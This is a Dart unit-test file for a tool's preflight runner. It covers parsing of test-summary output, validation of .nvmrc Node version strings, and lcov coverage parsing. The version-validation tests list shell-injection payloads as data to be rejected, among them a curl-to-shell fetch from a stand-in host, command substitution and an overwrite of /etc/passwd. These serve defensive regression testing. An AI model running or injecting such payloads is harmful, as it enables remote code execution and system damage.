import 'dart:io';

import 'package:mason_logger/mason_logger.dart';
import 'package:somnio/src/runner/preflight.dart';
import 'package:test/test.dart';

void main() {
  group('PreflightRunner.parseCompactTestOutput', () {
    late PreflightRunner runner;

    setUp(() {
      runner = PreflightRunner(logger: Logger(level: Level.quiet));
    });

    test('counts +N as passed and adds failures to the total', () {
      final counts = runner.parseCompactTestOutput(
        '+10 -2: Some tests failed.',
        '',
      );

      expect(counts.passed, 10);
      expect(counts.failed, 2);
      expect(counts.skipped, 0);
      expect(counts.total, 12);
    });

    test('includes skipped tests in the total', () {
      final counts = runner.parseCompactTestOutput(
        '+10 ~3: Some tests skipped.',
        '',
      );

      expect(counts.passed, 10);
      expect(counts.failed, 0);
      expect(counts.skipped, 3);
      expect(counts.total, 13);
    });

    test('counts passed, skipped and failed together', () {
      final counts = runner.parseCompactTestOutput(
        '+10 ~3 -2: Some tests failed.',
        '',
      );

      expect(counts.passed, 10);
      expect(counts.failed, 2);
      expect(counts.skipped, 3);
      expect(counts.total, 15);
    });

    test('reports an all-pass run', () {
      final counts =
          runner.parseCompactTestOutput('+42: All tests passed!', '');

      expect(counts.passed, 42);
      expect(counts.failed, 0);
      expect(counts.skipped, 0);
      expect(counts.total, 42);
    });

    test('reads the final summary line, not an earlier progress line', () {
      final counts = runner.parseCompactTestOutput(
        '+1: loads config\n'
            '+2: parses steps\n'
            '+2 -1: Some tests failed.',
        '',
      );

      expect(counts.passed, 2);
      expect(counts.failed, 1);
      expect(counts.total, 3);
    });

    test('returns zeroes when there is no summary line', () {
      final counts = runner.parseCompactTestOutput('No tests ran.', '');

      expect(counts.passed, 0);
      expect(counts.failed, 0);
      expect(counts.skipped, 0);
      expect(counts.total, 0);
    });
  });

  group('PreflightRunner.isValidNodeVersion', () {
    late PreflightRunner runner;

    setUp(() {
      runner = PreflightRunner(logger: Logger(level: Level.quiet));
    });

    test('accepts legitimate .nvmrc / .node-version specifiers', () {
      for (final version in [
        '18',
        'v18.17.0',
        '20.11',
        '16.20.2',
        'lts/*',
        'lts/iron',
        'node',
        'stable',
        'unstable',
      ]) {
        expect(
          runner.isValidNodeVersion(version),
          isTrue,
          reason: '$version should be accepted',
        );
      }
    });

    test(
      'rejects a .nvmrc shell injection payload (the reported exploit)',
      () {
        expect(runner.isValidNodeVersion('18; touch /tmp/pwned'), isFalse);
      },
    );

    test('rejects other shell metacharacter payloads', () {
      for (final payload in [
        '18 && curl -s https://evil.sh | sh',
        '18\ntouch /tmp/x',
        '18 `id`',
        '18\$(id)',
        '\$(id)',
        '18|sh',
        '18 > /etc/passwd',
        "18'; id; '",
      ]) {
        expect(
          runner.isValidNodeVersion(payload),
          isFalse,
          reason: '$payload should be rejected',
        );
      }
    });

    test(
      'rejects a trailing newline (non-multiLine \$ anchors to the true '
      'end of string, not before a trailing newline)',
      () {
        expect(runner.isValidNodeVersion('18\n'), isFalse);
      },
    );
  });

  group('PreflightRunner.parseLcovInfo', () {
    late PreflightRunner runner;
    late Directory tmp;

    setUp(() {
      runner = PreflightRunner(logger: Logger(level: Level.quiet));
      tmp = Directory.systemTemp.createTempSync('somnio-lcov-');
    });

    tearDown(() {
      if (tmp.existsSync()) tmp.deleteSync(recursive: true);
    });

    File writeLcov(String contents) {
      final file = File('${tmp.path}/lcov.info')..writeAsStringSync(contents);
      return file;
    }

    test('counts DA lines in handwritten files', () {
      final file = writeLcov(
        'SF:lib/src/vehicle.dart\n'
        'DA:1,1\n'
        'DA:2,1\n'
        'end_of_record\n',
      );

      final stats = runner.parseLcovInfo(file.path);

      expect(stats.total, 2);
      expect(stats.covered, 2);
      expect(stats.percentage, 100);
      expect(stats.files, 1);
    });

    test('excludes .g.dart records from the percentage', () {
      final file = writeLcov(
        'SF:lib/src/vehicle.dart\n'
        'DA:1,1\n'
        'DA:2,1\n'
        'end_of_record\n'
        'SF:lib/src/vehicle.g.dart\n'
        'DA:1,0\n'
        'DA:2,0\n'
        'DA:3,0\n'
        'end_of_record\n',
      );

      final stats = runner.parseLcovInfo(file.path);

      expect(stats.total, 2);
      expect(stats.covered, 2);
      expect(stats.percentage, 100);
      expect(stats.files, 1);
    });

    test('does not count an uncovered .g.dart file as a zero-coverage file',
        () {
      final file = writeLcov(
        'SF:lib/src/vehicle.g.dart\n'
        'DA:1,0\n'
        'end_of_record\n',
      );

      final stats = runner.parseLcovInfo(file.path);

      expect(stats.total, 0);
      expect(stats.files, 0);
      expect(stats.zeroFiles, 0);
      expect(stats.percentage, 0);
    });

    test('returns zeroes when the file is missing', () {
      final stats = runner.parseLcovInfo('${tmp.path}/missing.info');

      expect(stats.total, 0);
      expect(stats.covered, 0);
      expect(stats.percentage, 0);
    });
  });
}
